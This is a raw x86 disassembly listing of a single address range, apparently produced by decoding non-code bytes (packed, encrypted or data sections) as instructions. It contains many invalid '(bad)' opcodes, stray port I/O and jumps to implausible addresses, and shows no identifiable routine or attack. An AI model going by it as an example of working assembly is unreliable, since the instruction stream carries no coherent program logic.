  406fa0:	push   esi
  406fa1:	(bad)
  406fa4:	mov    ds:0x9c1bae45,al
  406fa9:	sbb    al,cl
  406fab:	test   ah,ah
  406fad:	(bad)  
  406fae:	sub    BYTE PTR [edx+edi*4-0x79d54c2d],0x0
  406fb6:	leave  
  406fb7:	pop    esp
  406fb8:	push   cs
  406fb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fba:	add    ecx,DWORD PTR [esi]
  406fbc:	test   DWORD PTR [edx+0x34],ecx
  406fbf:	mov    ds:0x677b09e9,eax
  406fc4:	mov    ch,0xd8
  406fc6:	enter  0xd230,0xe1
  406fca:	mov    cl,BYTE PTR [ebx-0x3980586d]
  406fd0:	inc    ecx
  406fd1:	cmp    ch,BYTE PTR [ebp-0x3c382051]
  406fd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fd8:	aaa    
  406fd9:	ror    DWORD PTR [esi+edi*8-0x71],cl
  406fdd:	sahf   
  406fde:	rol    al,0x1d
  406fe1:	pop    ebp
  406fe2:	mov    ah,0x55
  406fe4:	xchg   ebx,eax
  406fe5:	push   cs
  406fe6:	xrelease xchg DWORD PTR [esp-0x7de3ef55],esi
  406fee:	out    0xdc,eax
  406ff0:	mov    dh,0x4e
  406ff2:	mov    dl,0xcc
  406ff4:	loop   0x407071
  406ff6:	cmp    BYTE PTR [edi+0x68be287c],ch
  406ffc:	daa    
  406ffd:	push   esp
  406ffe:	mov    ebp,0xf0abaefe
  407003:	lods   eax,DWORD PTR ds:[esi]
  407004:	add    ebx,DWORD PTR [eax-0x1e]
  407007:	and    eax,0x5abf5ebe
  40700c:	scas   al,BYTE PTR es:[edi]
  40700d:	rcl    BYTE PTR [ebx+0xd49168f],0x97
  407014:	pop    esi
  407015:	call   0x88fd13b5
  40701a:	mov    ecx,0x82bc1103
  40701f:	push   edx
  407020:	test   eax,0xe48d2bd5
  407025:	inc    edx
  407026:	mov    ah,0x1b
  407028:	pushf  
  407029:	out    0xa7,eax
  40702b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40702c:	ja     0x406fd8
  40702e:	(bad)  
  40702f:	call   0x9c509bad
  407034:	push   ss
  407035:	mov    edx,eax
  407037:	inc    esi
  407038:	popa   
  407039:	adc    DWORD PTR [eax+eax*4+0x44],0xc3544607
  407041:	pop    ds
  407042:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407043:	lods   eax,DWORD PTR ds:[esi]
  407044:	lods   al,BYTE PTR ds:[esi]
  407045:	sub    edi,DWORD PTR [esi+0x4acb8276]
  40704b:	sub    DWORD PTR [esi+0x732b212d],eax
  407051:	mov    eax,ds:0x3427851
  407056:	fldenv [ebx+eax*2+0x0]
  40705a:	cmp    dh,al
  40705c:	push   esp
  40705d:	jae    0x40708c
  40705f:	push   eax
  407060:	inc    ebp
  407061:	lahf   
  407062:	adc    ah,ch
  407064:	ret    
  407065:	scas   eax,DWORD PTR es:[edi]
  407066:	add    DWORD PTR [ecx+0x263d3701],0xf358c0aa
  407070:	in     al,0xce
  407072:	add    al,cl
  407074:	sub    dh,bh
  407076:	ret    0xdf0d
  407079:	ja     0x4070e3
  40707b:	leave  
  40707c:	shl    DWORD PTR [ecx],cl
  40707e:	cmove  esp,ebp
  407081:	std    
  407082:	(bad)  
  407083:	xor    bl,BYTE PTR [esi-0x72]
  407086:	lods   al,BYTE PTR ds:[esi]
  407087:	(bad)  
  407088:	neg    ebx
  40708a:	push   esp
  40708b:	repnz fisub WORD PTR [ecx]
  40708e:	adc    BYTE PTR [ebx+edx*1],dh
  407091:	cwde   
  407092:	dec    esi
  407093:	iret   
  407094:	mov    dl,0x7
  407096:	mov    eax,0xd7a8b740
  40709b:	mov    ecx,0xadd537e3
  4070a0:	stc    
  4070a1:	inc    ebp
  4070a2:	sti    
  4070a3:	xchg   esp,eax
  4070a4:	fiadd  DWORD PTR [ecx+0x5a]
  4070a7:	push   esi
  4070a8:	inc    edx
  4070a9:	jmp    0x2bf0acf4
  4070ae:	mov    al,0xf2
  4070b0:	aaa    
  4070b1:	xor    ch,bl
  4070b3:	ret    0x2445
  4070b6:	and    DWORD PTR [esi+ebp*2-0x37],ebp
  4070ba:	pop    edi
  4070bb:	aad    0xda
  4070bd:	enter  0x2669,0x9f
  4070c1:	test   DWORD PTR [ebp-0x5576e315],esi
  4070c7:	cmp    esi,DWORD PTR [ecx-0x41]
  4070ca:	hlt    
  4070cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070cc:	lods   al,BYTE PTR ds:[esi]
  4070cd:	inc    ebx
  4070ce:	cmp    al,0xc5
  4070d0:	daa    
  4070d1:	int    0x81
  4070d3:	fdiv   QWORD PTR ds:0xef30fcdc
  4070d9:	ja     0x407138
  4070db:	mov    eax,0xeb216ee5
  4070e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070e1:	dec    ebp
  4070e2:	adc    eax,0xff07baa1
  4070e7:	xor    al,0x3e
  4070e9:	mov    esi,0xee992172
  4070ee:	aas    
  4070ef:	fld    TBYTE PTR [ecx-0x15]
  4070f2:	mov    ah,0x87
  4070f4:	pop    eax
  4070f5:	les    esi,FWORD PTR [esi]
  4070f7:	rcl    DWORD PTR [ebx+0x2b],0x81
  4070fb:	mov    eax,DWORD PTR ds:[edx+0x9]
  4070ff:	push   edx
  407100:	retf   0xfac9
  407103:	mov    dh,BYTE PTR [eax+0x10]
  407106:	fwait
  407107:	sub    bl,0x2
  40710a:	int3   
  40710b:	fisubr DWORD PTR [edi+eax*8-0xf]
  40710f:	lea    edx,[edx-0x69295672]
  407115:	loope  0x4070de
  407117:	add    eax,0xc0ffca2a
  40711c:	jle    0x407130
  40711e:	(bad)  
  407120:	xor    BYTE PTR [edi-0x61],ah
  407123:	add    ch,dl
  407125:	loope  0x40718f
  407127:	xchg   DWORD PTR [ecx],ecx
  407129:	addr16 mov edi,0x791bd3e5
  40712f:	jmp    0xbe36fe4e
  407134:	pop    ebx
  407135:	pop    ds
  407136:	or     DWORD PTR [eax+ebx*4],edx
  407139:	mov    DWORD PTR [edx],esi
  40713b:	and    al,0xeb
  40713d:	lds    ebx,FWORD PTR [esi-0x6c]
  407140:	jl     0x40717d
  407142:	in     al,dx
  407143:	dec    ecx
  407144:	xor    ch,BYTE PTR [esi-0x3b]
  407147:	and    eax,0xcc1ec370
  40714c:	js     0x4071c7
  40714e:	push   eax
  40714f:	adc    ah,BYTE PTR [ebp+eiz*1+0x75241228]
  407156:	jmp    0xf5da6046
  40715b:	je     0x407170
  40715d:	mov    eax,ds:0x1d24410e
  407162:	add    BYTE PTR [eax],dh
  407164:	pop    esp
  407165:	push   ds
  407166:	inc    esi
  407167:	jmp    0x407158
  407169:	(bad)  
  40716a:	or     dh,BYTE PTR [ebp-0x42]
  40716d:	or     edi,esp
  40716f:	retf   0x664b
  407172:	mov    DWORD PTR [edx],edi
  407174:	cwde   
  407175:	cmp    al,0xce
  407177:	ins    DWORD PTR es:[edi],dx
  407178:	sub    eax,0x10d11d92
  40717d:	daa    
  40717e:	lock and eax,0xf9aab342
  407184:	sbb    cl,cl
  407186:	sbb    BYTE PTR [edx+eax*2-0x6f],dl
  40718a:	int3   
  40718b:	xor    edx,DWORD PTR [ecx+0x516ec00f]
  407191:	dec    edx
  407192:	std    
  407193:	mov    eax,ds:0xcb35f876
  407198:	add    eax,0xb616403c
  40719d:	loope  0x40715e
  40719f:	fcomp  QWORD PTR [eax-0x29ff4f8f]
  4071a5:	push   ecx
  4071a6:	mov    ds:0x83828215,al
  4071ab:	(bad)  
  4071ac:	out    0x90,al
  4071ae:	shl    BYTE PTR [eax+ecx*8],cl
  4071b1:	pop    ss
  4071b2:	jmp    0x8e232fa3
  4071b7:	js     0x407204
  4071b9:	mov    al,0x29
  4071bb:	out    dx,al
  4071bc:	in     al,dx
  4071bd:	push   cs
  4071be:	mov    bh,0x47
  4071c0:	jge    0x4071c3
  4071c2:	xor    esp,DWORD PTR [ecx-0x3fde09a2]
  4071c8:	fsubr  QWORD PTR [edx]
  4071ca:	and    edi,DWORD PTR [ebx+0x6512011]
  4071d0:	push   ds
  4071d1:	jle    0x40715d
  4071d3:	and    DWORD PTR [ebx+0x74c35cef],ebp
  4071d9:	repz pop eax
  4071db:	push   edi
  4071dc:	mov    bl,BYTE PTR [ecx+0x6a]
  4071df:	mov    dh,0x55
  4071e1:	mov    bh,dh
  4071e3:	adc    bh,bl
  4071e5:	das    
  4071e6:	mov    ebx,0xdabd9c65
  4071eb:	inc    ebx
  4071ec:	jle    0x4071a4
  4071ee:	popa   
  4071ef:	mov    WORD PTR [eax+0x5e9e216c],cs
  4071f5:	push   edi
  4071f6:	sub    ebp,DWORD PTR [eax]
  4071f8:	adc    ebp,DWORD PTR [ecx]
  4071fa:	arpl   WORD PTR [eax-0x50],si
  4071fd:	push   0xffffff91
  4071ff:	add    eax,0x876dbc0f
  407204:	div    DWORD PTR [edi-0x30d9a4dd]
  40720a:	popf   
  40720b:	add    eax,0x447f0f57
  407210:	and    edi,DWORD PTR [ecx+eiz*8]
  407213:	push   ebx
  407214:	push   0x246dffc9
  407219:	pushf  
  40721a:	(bad)
  40721e:	inc    edi
  40721f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407220:	dec    esp
  407221:	dec    ecx
  407222:	pop    ds
  407223:	push   ss
  407224:	and    dl,ch
  407226:	sbb    DWORD PTR [ecx+0x6b],edx
  407229:	fild   DWORD PTR [ecx+ebp*8+0x18]
  40722d:	out    0x95,al
  40722f:	xchg   ebx,eax
  407230:	mov    edi,0xa9908c53
  407235:	pop    es
  407236:	repnz cld 
  407238:	sbb    DWORD PTR [ecx],eax
  40723a:	retf   
  40723b:	ret    0xd0ac
  40723e:	out    0xe3,eax
  407240:	scas   al,BYTE PTR es:[edi]
  407241:	ja     0x407252
  407243:	popf   
  407244:	aad    0x2b
  407246:	dec    edx
  407247:	xor    al,0x58
  407249:	ss imul ebx,ecx,0xc0980b6a
  407250:	mov    ebp,0xdc47e647
  407255:	addr16 inc ebx
  407257:	sub    al,0x1f
  407259:	sahf   
  40725a:	pop    edx
  40725b:	shl    DWORD PTR [esi],cl
  40725d:	dec    ecx
  40725e:	mov    edx,0x263b91e5
  407263:	leavew 
  407265:	enter  0xa326,0xe5
  407269:	or     esi,esi
  40726b:	cli    
  40726c:	mov    edx,DWORD PTR [eax+0xb]
  40726f:	jl     0x4072eb
  407271:	jnp    0x4072c1
  407273:	push   ecx
  407274:	fld    st(3)
  407276:	or     eax,0xd61e75a9
  40727b:	sahf   
  40727c:	mov    dh,BYTE PTR [ebx+ecx*2-0x27]
  407280:	popa   
  407281:	je     0x4072d8
  407283:	push   ebp
  407284:	fcom   QWORD PTR [eax]
  407286:	aas    
  407287:	sub    al,BYTE PTR [ecx+0x41]
  40728a:	ss xchg ebx,eax
  40728c:	or     DWORD PTR [eax],ecx
  40728e:	pusha  
  40728f:	into   
  407290:	ficomp WORD PTR [eax]
  407292:	sti    
  407293:	sbb    al,0xd5
  407295:	rcl    BYTE PTR [eax],1
  407297:	mov    ds:0xfc55603d,eax
  40729c:	mov    ds:0xc55af842,eax
  4072a1:	jmp    0xe255:0x2e934f15
  4072a8:	push   ebx
  4072a9:	cmp    bl,BYTE PTR [esi+0x11]
  4072ac:	idiv   DWORD PTR [edx+0x7b6ac2ed]
  4072b2:	xlat   BYTE PTR ds:[ebx]
  4072b3:	adc    BYTE PTR gs:[edi+0x14],ah
  4072b7:	sub    al,0x34
  4072b9:	mov    ds:0xa1b71a77,eax
  4072be:	gs push cs
  4072c0:	mov    dl,0x36
  4072c2:	push   eax
  4072c3:	push   edx
  4072c4:	cli    
  4072c5:	(bad)  
  4072c6:	push   ds
  4072c7:	hlt    
  4072c8:	bound  ebp,QWORD PTR [esi-0x2b]
  4072cb:	sub    BYTE PTR [edi*2+0x27beefb3],bl
  4072d2:	mov    ebp,0x61124026
  4072d7:	loope  0x40726b
  4072d9:	xor    BYTE PTR [eax+0x43c84160],cl
  4072df:	and    ebp,DWORD PTR [ebp-0x3c08a14a]
  4072e5:	sti    
  4072e6:	xchg   esp,eax
  4072e7:	xchg   edi,eax
  4072e8:	sub    al,0xe5
  4072ea:	sub    BYTE PTR [ebx],bl
  4072ec:	adc    ecx,esi
  4072ee:	pop    eax
  4072ef:	push   edx
  4072f0:	push   edi
  4072f1:	lea    esi,ds:0x6a27da92
  4072f7:	mov    WORD PTR [esi-0x4c351691],es
  4072fd:	xchg   esi,eax
  4072fe:	out    dx,al
  4072ff:	aad    0xeb
  407301:	jne    0x407301
  407303:	lahf   
  407304:	stos   BYTE PTR es:[edi],al
  407305:	call   0x2967368d
  40730a:	pop    ds
  40730b:	pop    edi
  40730c:	mov    ebp,0xd2294d53
  407311:	fcom   DWORD PTR [ecx+0x1d9e4dab]
  407317:	xchg   ecx,eax
  407318:	imul   ecx,esp,0x5f
  40731b:	push   esp
  40731c:	mov    al,ds:0x54044bfc
  407321:	cdq    
  407322:	ins    BYTE PTR es:[edi],dx
  407323:	in     al,0xb8
  407325:	jns    0x4072ff
  407327:	mov    dh,0x2b
  407329:	xchg   ecx,eax
  40732a:	xchg   edx,eax
  40732b:	mov    cl,0x41
  40732d:	(bad)  
  40732e:	aam    0xd4
  407330:	add    ebp,DWORD PTR [eax]
  407332:	mov    ah,0x34
  407334:	cli    
  407335:	ret    
  407336:	daa    
  407337:	sbb    al,0x36
  40733a:	and    DWORD PTR gs:[eax+0x51],esi
  40733e:	push   ebx
  40733f:	hlt    
  407340:	push   ds
  407341:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407342:	adc    eax,0xefb45ff3
  407347:	or     eax,0xabf1d5f4
  40734c:	mov    cs,ebx
  40734e:	shr    DWORD PTR [edx-0xecdca35],cl
  407354:	add    BYTE PTR [ebx-0x4421cb96],cl
  40735a:	xchg   edi,eax
  40735b:	mov    esp,0xe52d0960
  407360:	push   0x23ffe2f2
  407365:	mul    BYTE PTR [edx+0x6b]
  407368:	mov    al,ds:0x1f7eda4e
  40736d:	push   cs
  40736e:	loopne 0x4073b3
  407370:	xchg   esi,eax
  407371:	pushf  
  407372:	jmp    0x40731c
  407374:	xchg   DWORD PTR [ebx+0x17],edi
  407377:	mov    ah,0x32
  407379:	cmp    al,0x8e
  40737b:	imul   esi,edx,0xffffff91
  40737e:	cmp    al,BYTE PTR [ebp+eax*4-0xcde2530]
  407385:	mov    ebp,0xde93eee2
  40738a:	jmp    0x40735f
  40738c:	jg     0x40734a
  40738e:	fwait
  40738f:	imul   ecx,DWORD PTR [esi-0x29e6554],0x942514ec
  407399:	cmc    
  40739a:	jb     0x4073b9
  40739c:	movhlps xmm1,xmm6
  40739f:	cmp    esp,esi
  4073a1:	cs adc al,0x2b
  4073a4:	ds and al,0xe0
  4073a7:	dec    edx
  4073a8:	adc    eax,0x276053fa
  4073ad:	xchg   esp,eax
  4073ae:	in     eax,0x74
  4073b0:	xor    al,0x33
  4073b2:	xchg   ebp,eax
  4073b3:	sbb    dh,dl
  4073b5:	ins    BYTE PTR es:[edi],dx
  4073b6:	cwde   
  4073b7:	xor    BYTE PTR [esi-0x7749968],ch
  4073bd:	cmp    ebx,DWORD PTR [ecx]
  4073bf:	jo     0x407371
  4073c1:	or     eax,0x2a452e9b
  4073c6:	lock xchg edi,eax
  4073c8:	lock sbb DWORD PTR [edx-0x39],edi
  4073cc:	pop    esi
  4073cd:	dec    edx
  4073ce:	mov    DWORD PTR [edi],edx
  4073d0:	test   BYTE PTR [ebx],cl
  4073d2:	neg    BYTE PTR [ecx+eiz*1]
  4073d5:	int    0xda
  4073d7:	mov    ?,WORD PTR [ecx-0x5b568ff8]
  4073dd:	jp     0x4073a2
  4073df:	add    BYTE PTR [edx],al
  4073e1:	jecxz  0x4073e4
  4073e3:	enter  0xea31,0xef
  4073e7:	ficom  DWORD PTR [ecx]
  4073e9:	loope  0x40742b
  4073eb:	sbb    DWORD PTR [ebx+eax*4],edi
  4073ee:	add    eax,0xd7c720
  4073f3:	mov    edi,0xe0f71e04
  4073f8:	lea    edx,[edx+0x3a]
  4073fb:	lahf   
  4073fc:	aaa    
  4073fd:	das    
  4073fe:	add    ecx,edi
  407400:	mov    DWORD PTR [ecx],ebp
  407402:	popf   
  407403:	sub    eax,0x43aa6d7c
  407408:	cmc    
  407409:	cmp    BYTE PTR [esi+edx*2-0x14a2f007],ch
  407410:	or     eax,0x9b67bb1f
  407415:	or     eax,0xbd7e1259
  40741a:	inc    eax
  40741b:	in     eax,dx
  40741c:	or     al,0x3a
  40741e:	push   ebp
  40741f:	push   es
  407420:	push   edi
  407421:	mov    ebp,fs
  407423:	xor    eax,0xdddcf91
  407428:	shr    ebp,1
  40742a:	mov    ?,WORD PTR [ebx+0x52dcf889]
  407430:	dec    ebp
  407431:	mov    bl,0x42
  407433:	fsub   QWORD PTR [ebx]
  407435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407436:	and    BYTE PTR [eax],dh
  407438:	push   ebp
  407439:	sbb    al,0x30
  40743b:	stc    
  40743c:	int    0xc8
  40743e:	jae    0x4073e5
  407440:	push   ss
  407441:	loopne 0x40744f
  407443:	xchg   ebx,edi
  407445:	in     eax,0x16
  407447:	sub    dl,BYTE PTR [ebp+0x38bc1204]
  40744d:	lock (bad) 
  40744f:	add    bh,BYTE PTR [ebp*2+0x509cd9a4]
  407456:	mov    ecx,0x57c4e6af
  40745b:	loopne 0x407423
  40745d:	adc    ch,BYTE PTR [eax+ebx*8-0x5e91ea9a]
  407464:	cmp    cl,BYTE PTR [edi+ebp*1]
  407467:	inc    ebx
  407468:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40746a:	adc    ch,BYTE PTR [edx+0x5c90e799]
  407470:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407471:	jno    0x40742e
  407473:	aam    0xd2
  407475:	cwde   
  407476:	retf   
  407477:	test   al,0x0
  407479:	mov    BYTE PTR [ecx],dl
  40747b:	mov    ss,ebx
  40747d:	in     eax,dx
  40747e:	loopne 0x407455
  407480:	xchg   esp,eax
  407481:	jle    0x407452
  407483:	js     0x40745d
  407485:	fld    QWORD PTR [ebx]
  407487:	xchg   ecx,eax
  407488:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407489:	fcom   st(7)
  40748b:	add    BYTE PTR [ebx-0x15],dh
  40748e:	dec    esp
  40748f:	test   ch,0xb7
  407492:	(bad)  
  407493:	out    0xea,eax
  407495:	out    dx,al
  407496:	or     BYTE PTR [edi+eiz*4+0x17],bh
  40749a:	mov    al,ds:0x44e1073e
  40749f:	pop    esp
  4074a0:	fiadd  DWORD PTR [ebx+0x3a29e6ab]
  4074a6:	(bad)  
  4074a8:	xchg   ebx,eax
  4074a9:	stc    
  4074aa:	or     ecx,DWORD PTR [esi+0x71d4d4e6]
  4074b0:	pop    ss
  4074b1:	fcomp  DWORD PTR ds:0x73408d06
  4074b7:	pop    ss
  4074b8:	repz cmp ecx,DWORD PTR [edx-0x721165e3]
  4074bf:	push   eax
  4074c0:	test   al,0xdf
  4074c2:	sbb    BYTE PTR [esi-0x3f],0x30
  4074c6:	jmp    0xec250beb
  4074cb:	pop    ebx
  4074cc:	push   ebp
  4074cd:	xchg   DWORD PTR [ebx+0x6e4af335],ebp
  4074d3:	fwait
  4074d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074d5:	loope  0x407476
  4074d7:	inc    ebx
  4074d8:	xor    cl,bl
  4074da:	gs loop 0x4074a3
  4074dd:	sub    al,0x3c
  4074df:	jns    0x4074da
  4074e1:	xor    ch,BYTE PTR [esi]
  4074e3:	jae    0x407521
  4074e5:	adc    DWORD PTR [esi-0x743132],esp
  4074eb:	mov    ds,WORD PTR [ebp+0x6f4e2cbb]
  4074f1:	add    BYTE PTR ds:0xfda62d9f,cl
  4074f7:	push   ebp
  4074f8:	jb     0x4074b3
  4074fa:	ins    DWORD PTR es:[edi],dx
  4074fb:	stos   DWORD PTR es:[edi],eax
  4074fc:	jo     0x4074be
  4074fe:	jno    0x4074e7
  407500:	out    dx,al
  407501:	pop    ecx
  407502:	aam    0xad
  407504:	cs scas eax,DWORD PTR es:[edi]
  407506:	add    edx,DWORD PTR [eax+edx*8]
  407509:	stc    
  40750a:	arpl   WORD PTR [edx+0x1d63638],bx
  407510:	dec    eax
  407511:	xor    al,ch
  407513:	fnstenv [edx+0x6d5d940a]
  407519:	out    dx,al
  40751a:	ja     0x4074d0
  40751c:	dec    esi
  40751d:	mov    DWORD PTR [eax-0x2e],eax
  407520:	mov    ds:0x23e5d6b1,eax
  407525:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407526:	retf   
  407527:	nop
  407528:	xchg   ebx,ebx
  40752a:	aam    0xb4
  40752c:	enter  0x67b8,0x4f
  407530:	xchg   edx,eax
  407531:	ret    
  407532:	xlat   BYTE PTR ds:[ebx]
  407533:	push   ebp
  407534:	scas   al,BYTE PTR es:[edi]
  407535:	xchg   esi,eax
  407536:	iret   
  407537:	cmp    bl,cl
  407539:	and    DWORD PTR [edi-0x2549912a],0xfffffff2
  407540:	out    0xd4,al
  407542:	sbb    eax,esp
  407544:	pop    ecx
  407545:	pop    ebx
  407546:	loop   0x4075c0
  407548:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407549:	mov    bh,0x3e
  40754b:	pusha  
  40754c:	cmc    
  40754d:	adc    eax,0xf66e5a
  407552:	in     eax,dx
  407553:	xor    BYTE PTR [edx+ebx*1-0x1aeea9ec],0xa4
  40755b:	adc    ebx,DWORD PTR [esi-0x7ee38f1d]
  407561:	pop    ss
  407562:	(bad)  
  407563:	lock daa 
  407565:	shl    DWORD PTR [esp+edx*8+0x3a3c3252],cl
  40756c:	(bad)  [ecx]
  40756e:	fs in  al,dx
  407570:	cmp    bl,BYTE PTR [ebx+0x7a0ab18b]
  407576:	jge    0x4075b4
  407578:	mov    bl,0xac
  40757a:	in     al,dx
  40757b:	es jge 0x407555
  40757e:	xor    al,0x8
  407580:	inc    edx
  407581:	mov    ds:0x53074665,eax
  407586:	ret    0x66ea
  407589:	cmp    eax,0x7aa4d054
  40758e:	fstp   QWORD PTR [edx+0x5c]
  407591:	pop    es
  407592:	retf   
  407593:	push   0xffffff8c
  407595:	ss test bl,0xf1
  407599:	mov    ebp,0xed6e5e36
  40759e:	pop    eax
  40759f:	cmp    dh,al
  4075a1:	or     DWORD PTR [edx],ebx
  4075a3:	add    eax,0x66e6c154
  4075a8:	pop    esp
  4075a9:	push   esp
  4075aa:	sbb    ah,BYTE PTR [esi-0x7b]
  4075ad:	mov    ?,WORD PTR ds:0xcb138b94
  4075b3:	dec    esp
  4075b4:	xchg   edi,eax
  4075b5:	adc    dh,bh
  4075b7:	xchg   edx,eax
  4075b8:	bound  ecx,QWORD PTR [edi]
  4075ba:	je     0x407602
  4075bc:	pop    ebx
  4075bd:	add    BYTE PTR [ebp+0x66],dl
  4075c0:	sbb    esp,ebp
  4075c2:	into   
  4075c3:	in     eax,0xa7
  4075c5:	jne    0x40761e
  4075c7:	jo     0x407644
  4075c9:	push   esp
  4075ca:	rol    BYTE PTR [edi-0x34],0xfe
  4075ce:	sar    DWORD PTR [ebp+0x6ca3b8fd],cl
  4075d4:	fbld   TBYTE PTR [edi+0x42d1fa4]
  4075da:	call   0x35fa04f5
  4075df:	std    
  4075e0:	(bad)  
  4075e1:	or     eax,0x8875cc8d
  4075e6:	cmc    
  4075e7:	sar    DWORD PTR [eax-0x80],cl
  4075ea:	fwait
  4075eb:	dec    esi
  4075ec:	xchg   ecx,eax
  4075ed:	sub    eax,0xaa0aeb99
  4075f2:	xchg   ebp,eax
  4075f3:	test   eax,0x17896916
  4075f8:	call   0xef43:0x7270487c
  4075ff:	pop    esi
  407600:	jp     0x407662
  407602:	(bad)
  407606:	bound  esp,QWORD PTR [edx+edi*8+0x8226f2b]
  40760d:	test   BYTE PTR [esi],dh
  40760f:	mov    WORD PTR [edi-0x51],gs
  407612:	enter  0xac29,0x76
  407616:	repnz scas al,BYTE PTR es:[edi]
  407618:	(bad)  
  407619:	jno    0x40764f
  40761b:	and    bl,cl
  40761d:	out    0x2e,eax
  40761f:	sub    DWORD PTR [edi-0x1d],edi
  407622:	lods   eax,DWORD PTR ds:[esi]
  407623:	test   BYTE PTR [eax],0x90
  407626:	(bad)  
  407627:	jae    0x40769c
  407629:	in     al,dx
  40762a:	xchg   edx,eax
  40762b:	rcl    BYTE PTR [ebx+0x71],cl
  40762e:	sbb    al,0xe4
  407630:	bound  esi,QWORD PTR [edx]
  407632:	das    
  407633:	or     DWORD PTR [edx+0x49],ecx
  407636:	xlat   BYTE PTR ds:[ebx]
  407637:	cwde   
  407638:	cmp    DWORD PTR [ebx+edi*2+0x0],0xffffff91
  40763d:	and    BYTE PTR [edx+edx*8+0x68bc46a7],ch
  407644:	fs cmp eax,0xd8d736cc
  40764a:	jge    0x4075e3
  40764c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40764d:	sbb    cl,0x3e
  407650:	xor    BYTE PTR [ebx+0x20a55503],dl
  407656:	dec    ebp
  407657:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407658:	dec    edx
  407659:	outs   dx,DWORD PTR ds:[esi]
  40765a:	sub    al,0x1d
  40765c:	fs adc al,0xc
  40765f:	add    edx,ecx
  407661:	pop    edi
  407662:	into   
  407663:	leave  
  407664:	mov    eax,ds:0xb90020a6
  407669:	pop    ds
  40766a:	std    
  40766b:	in     al,0x6f
  40766d:	mov    eax,0xd4a05220
  407672:	or     al,0x7d
  407674:	mov    ah,0x89
  407676:	mov    edi,0x749b0a52
  40767b:	mov    ?,WORD PTR [ebx]
  40767d:	or     ch,BYTE PTR [edi+0x45da1903]
  407683:	in     eax,dx
  407684:	adc    al,0xf2
  407686:	mov    ah,0xca
  407688:	inc    ebp
  407689:	add    ah,BYTE PTR [edi+0x1a]
  40768c:	or     al,0x36
  40768e:	inc    ebx
  40768f:	mov    dh,0x2d
  407691:	inc    ecx
  407692:	test   al,0x8a
  407694:	sub    DWORD PTR [edi+eiz*1-0x8],eax
  407698:	setl   BYTE PTR [ebp+0x543f79c2]
  40769f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076a0:	xchg   ebp,eax
  4076a1:	and    ebx,eax
  4076a3:	adc    BYTE PTR [esi],al
  4076a5:	in     al,dx
  4076a6:	push   ds
  4076a7:	hlt    
  4076a8:	ss dec esp
  4076aa:	fldcw  WORD PTR [edi-0x9]
  4076ad:	daa    
  4076ae:	inc    eax
  4076af:	cmp    BYTE PTR [eax],dl
  4076b1:	jge    0x40764f
  4076b3:	jecxz  0x407674
  4076b5:	jno    0x40764e
  4076b7:	fist   WORD PTR [ebx+0x117da349]
  4076bd:	mov    ecx,0x92d0e236
  4076c2:	jp     0x4076ae
  4076c4:	pop    edx
  4076c5:	push   0xffffffe1
  4076c7:	inc    esi
  4076c8:	xchg   ebx,eax
  4076c9:	cmc    
  4076ca:	nop
  4076cb:	mov    ch,0x1b
  4076cd:	sti    
  4076ce:	imul   ebp,DWORD PTR [edx-0x7c249672],0x44152216
  4076d8:	sbb    eax,0x275aecf2
  4076dd:	dec    esp
  4076de:	not    DWORD PTR [edx+edx*8+0x75dbc811]
  4076e5:	and    eax,0x503975ba
  4076ea:	push   ebp
  4076eb:	ja     0x40774f
  4076ed:	lods   al,BYTE PTR ds:[esi]
  4076ee:	stos   DWORD PTR es:[edi],eax
  4076ef:	repz mov edx,DWORD PTR [ebx]
  4076f2:	fadd   QWORD PTR [ecx+0x2]
  4076f5:	adc    al,0xef
  4076f7:	mov    DWORD PTR [edx],esp
  4076f9:	ins    DWORD PTR es:[edi],dx
  4076fa:	xchg   DWORD PTR [ecx+0x64],ebp
  4076fd:	sub    eax,DWORD PTR [ecx-0x35]
  407700:	or     eax,0xc2e9d02b
  407705:	jmp    0xe94d:0x5938eaa
  40770c:	sub    DWORD PTR [edx-0x56ab90fd],eax
  407712:	sbb    BYTE PTR [edi+0x1178757c],ch
  407718:	adc    DWORD PTR [ebp+0x5b],ebp
  40771b:	mov    ds,edi
  40771d:	xchg   edx,eax
  40771e:	out    0xda,eax
  407720:	dec    esp
  407721:	jne    0x4077a2
  407723:	lods   eax,DWORD PTR ds:[esi]
  407724:	mov    bl,0xae
  407726:	sti    
  407727:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407728:	mov    ebx,cs
  40772a:	call   0xac52939b
  40772f:	fnstcw WORD PTR [eax]
  407731:	xlat   BYTE PTR ds:[ebx]
  407732:	mov    cl,0xf5
  407734:	jg     0x407796
  407736:	push   eax
  407737:	popf   
  407738:	aaa    
  407739:	scas   eax,DWORD PTR es:[edi]
  40773a:	mov    ah,0x9f
  40773c:	adc    dh,cl
  40773e:	(bad)  
  40773f:	fwait
  407740:	pop    edx
  407741:	outs   dx,DWORD PTR ds:[esi]
  407742:	in     al,0xa3
  407744:	ins    DWORD PTR es:[edi],dx
  407745:	xchg   ebx,eax
  407746:	lods   al,BYTE PTR ds:[esi]
  407747:	pop    esp
  407748:	(bad)  
  407749:	in     al,dx
  40774a:	and    DWORD PTR [eax-0xb5f37ef],edx
  407750:	cmp    bh,BYTE PTR [ecx-0x56]
  407753:	aas    
  407754:	rol    BYTE PTR [edi],1
  407756:	cs es ficom WORD PTR gs:[esi+0x78]
  40775c:	fild   DWORD PTR [ecx]
  40775e:	gs xchg ebp,eax
  407760:	outs   dx,DWORD PTR ds:[esi]
  407761:	rol    DWORD PTR [edi-0x22],1
